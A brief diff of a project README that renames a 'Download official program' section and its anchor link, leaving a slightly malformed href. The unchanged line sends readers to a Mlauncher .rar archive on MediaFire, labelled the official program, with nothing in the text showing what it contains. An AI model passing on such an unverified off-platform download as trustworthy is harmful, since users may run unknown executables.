@@ -5,10 +5,10 @@
   &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
   <a href="#contributing">Contributing</a>
   &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#Download%20official%20program>Download program</a>
+  <a href="#Download>Download program</a>
 </p>
 
-## Download official program
+## Download
 The official link of the program is: https://www.mediafire.com/file/ye4ia0k4jb7nj53/Mlauncher.rar/file
 
 
